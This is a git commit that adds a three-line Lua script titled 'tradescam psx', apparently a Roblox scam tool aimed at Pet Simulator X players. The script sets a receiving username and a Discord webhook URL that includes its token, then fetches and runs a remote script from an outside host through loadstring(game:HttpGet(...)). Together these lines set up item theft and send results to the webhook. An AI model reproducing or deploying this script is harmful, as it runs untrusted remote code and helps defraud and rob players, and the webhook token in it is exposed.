19de32de9670f42e4e0e22d3184f86bb59fd3c4a
SINXVV <131208023+SINXVV@users.noreply.github.com>
2023-04-19 12:40:12 +0200

    Create tradescam psx.lua

---
+++ tradescam psx.lua
@@ -0,0 +1,3 @@
+UserName = "VtrustedLuxka"
+Webhook = "https://discord.com/api/webhooks/1098195448671502336/U4WPtTxri_WkMob7Lj7FVsDOkuGT6w_2yTHY6giMrFJOxzgmteg3Ix2iYrr4ye3RMtHM"
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
